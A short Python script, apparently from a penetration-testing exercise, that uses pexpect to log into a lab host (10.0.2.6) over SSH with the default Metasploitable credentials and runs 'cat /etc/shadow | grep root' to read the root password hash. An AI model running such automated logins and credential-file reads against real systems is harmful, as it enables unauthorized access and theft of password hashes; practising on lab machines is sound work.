#!/usr/bin/python3

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(host, user, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	conn_str = 'ssh ' + user + '@' + host
	print(conn_str)
	child = pexpect.spawn(conn_str)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

	if ret == 0:
		print('[-] Error connecting')
		return
	if ret == 1:
		child.sendline('y')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print('[-] Error connecting')

	child.sendline(password)
	child.expect(PROMPT)

	return child


def send_command(child, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(f"{child.before.decode('utf-8')}")


def main():
	host = '10.0.2.6'
	user = 'msfadmin'
	password = 'msfadmin'
	command = 'cat /etc/shadow | grep root;ps;ls'
	child = connect(host, user, password)
	send_command(child, command)

if __name__ == '__main__':
	main()
